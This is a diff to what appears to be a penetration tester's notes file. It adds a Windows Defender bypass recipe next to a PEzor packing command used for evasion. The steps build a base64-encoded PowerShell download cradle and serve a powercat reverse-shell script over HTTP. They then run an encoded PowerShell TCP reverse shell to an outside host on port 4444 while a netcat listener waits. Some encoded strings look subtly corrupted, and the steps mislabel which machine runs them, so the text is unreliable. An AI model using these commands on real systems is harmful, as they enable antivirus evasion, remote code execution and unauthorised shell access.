@@ -229,3 +229,21 @@ bash PEzor.sh -h
 export PATH=$PATH:~/go/bin/:/opt/PEzor:/opt/PEzor/deps/donut/:/opt/PEzor/deps/wclang/_prefix_PEzor_/bin/
 bash PEzor.sh -unhook -antidebug -text -self -sleep=120 binary.exe -z 2
 ```
+# A method that bypassed Defender on an engagement at work (Sometime 2020) [Confirm if it still works]
+
+0. Download and add `procat -c x.x.x.x-p 4444 -e cmd.exe` to the bottom of `procat.ps1`.
+
+1. Execute: `echo -n 'iex (New-Object Net.WebClient).DownloadString("http://x.x.x.x/procat.ps1")' | iconv -t utf-16le | base64 -w0` on the attacking machine.
+
+2. Execute a Python server on the attacking machine:
+```python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+```
+
+3. Execute the PowerShell command on the attacking machine: `powershell -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAABAcwAxACIAKQA=`.
+
+4. Run a `netcat` listener on the attacking machine: `nc -nlvp 4444`.
+
+5. Execute the PowerShell command on the attacking machine: `powershell.exe -a '-NoProfile -Command powershell.exe -EncodedCommand JABzAG8AYwBrAGUAdAAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0bwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAoACcANQAyAC4ANgAzAC4AMQA4AC4AMQA4ACcALAAgADQANAA0ADQAKQA7AAoAaQBmACgAJABzAG8AYwBrAGUAdAAgAC0AZQBxACAAJABuAHUAbABsACkAewBlAHgAaQB0ACAAMQB9AAoAJABzAHQAcgBlAGEAbQAgAD0AIAAkAHMAbwBjAGsAZQB0AC40AHIAZQBhAG0AKAApADsACgAkAHc'`
+
+6. If lucky, you may get a shell.
